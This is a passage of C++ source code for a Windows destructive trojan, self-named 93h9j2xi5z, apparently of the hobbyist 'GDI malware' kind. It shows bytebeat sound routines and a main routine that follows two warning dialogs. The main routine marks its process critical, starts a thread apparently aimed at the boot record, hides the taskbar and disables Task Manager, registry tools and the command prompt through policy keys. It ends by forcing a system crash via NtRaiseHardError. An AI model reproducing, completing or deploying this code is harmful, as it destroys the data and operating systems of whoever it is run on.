    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 7 | t | t >> 6) * 150 + 8 * (t & t >> 13 | t >> 9);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 13000, 13000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[13000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << 1 ^ (t << 6) + (t >> 7) & t >> 15 | t >> 4 - (1 ^ 7 & t >> 19) | t >> 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 2048 ? 6 : 16) + (1 & t >> 14)) >> (3 & t >> 8) | t >> (t & 2048 ? 3 : 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t + t >> 7 & t >> 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * t & t >> 4 | 9 * t & t >> 7 | 6 * t & t >> 9 | 4 * t & t >> 10);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI taskbar(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as 93h9j2xi5z that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"93h9j2xi5z", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"93h9j2xi5z", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, taskbar, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(5000);
            HANDLE thread0 = CreateThread(0, 0, nosignal, 0, 0, 0);
            sound0();
            Sleep(10000);
            TerminateThread(thread0, 0);
            CloseHandle(thread0);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, darker, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, polygon, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            CreateThread(0, 0, opener, 0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, woah, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, lines, 0, 0, 0);
            HANDLE thread7dot2 = CreateThread(0, 0, shell32, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            RedrawWindow(0, 0, 0, 133);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, shader6, 0, 0, 0);
            sound8();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}